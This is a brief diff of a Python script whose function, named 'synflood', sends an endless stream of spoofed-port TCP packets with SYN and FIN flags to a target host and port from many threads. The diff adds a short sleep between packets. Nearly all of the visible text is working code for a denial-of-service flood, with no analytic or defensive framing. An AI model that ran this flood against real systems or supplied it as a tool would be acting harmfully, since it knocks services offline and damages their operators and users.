@@ -17,6 +17,7 @@ def synflood(target, port):
 	while 1:
 		x = random.randint(1024, 65535)
 		send(IP(dst=target)/TCP(dport=port, sport=x, flags='FS'), verbose=0)
+		sleep(0.05)
 
 for i in range(threads):
 	Thread(target=synflood, args=(target,port)).start()
